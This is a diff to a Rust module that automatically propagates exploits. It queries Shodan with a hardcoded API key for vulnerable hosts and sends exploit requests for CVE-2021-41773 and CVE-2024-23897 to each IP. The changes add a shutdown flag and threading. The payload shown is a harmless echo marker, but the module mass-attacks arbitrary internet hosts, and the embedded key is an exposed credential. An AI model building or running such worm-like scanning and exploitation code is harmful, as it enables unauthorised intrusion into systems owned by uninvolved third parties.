@@ -5,6 +5,9 @@ use crate::shodan::Shodan;
 use log::{info, warn};
 
 use std::net::Ipv4Addr;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+use std::thread::{self, JoinHandle};
 
 const PAYLOAD: &'static str = "echo 37714-1202-EVC | rev";
 
@@ -17,13 +20,15 @@ pub struct Exploit {
 pub struct Propogate {
     shodan: Shodan,
     exploits: Vec<Exploit>,
+    should_close: Arc<AtomicBool>,
 }
 
 impl Propogate {
-    pub fn new() -> Propogate {
+    pub fn new(should_close: Arc<AtomicBool>) -> Propogate {
         Propogate {
             shodan: Shodan::new("7XRdrUMb9i2N6P6rqyXIM3PyDGBl6Wyg"),
             exploits: Vec::new(),
+            should_close,
         }
     }
 
@@ -34,7 +39,7 @@ impl Propogate {
         });
     }
 
-    pub fn run(&mut self) -> ! {
+    pub fn run(&mut self) {
         loop {
             for exploit in self.exploits.iter() {
                 let mut page = 0;
@@ -50,6 +55,10 @@ impl Propogate {
                         if let Err(err) = http::send(ip, (exploit.request)(ip.to_string(), PAYLOAD)) {
                             warn!("failed to send exploit to {}, {}", ip, err);
                         }
+
+                        if self.should_close.load(Ordering::Relaxed) {
+                            return;
+                        }
                     }
 
                     page += 1;
@@ -59,8 +68,8 @@ impl Propogate {
     }
 }
 
-pub fn run() -> ! {
-    let mut propogate = Propogate::new();
+pub fn spawn(should_close: Arc<AtomicBool>) -> JoinHandle<()> {
+    let mut propogate = Propogate::new(should_close);
 
     // https://nvd.nist.gov/vuln/detail/CVE-2021-41773
 
@@ -86,7 +95,9 @@ pub fn run() -> ! {
 
     // https://nvd.nist.gov/vuln/detail/cve-2024-23897
 
-    propogate.run()
+    thread::spawn(move || {
+        propogate.run()
+    })
 }
 
 
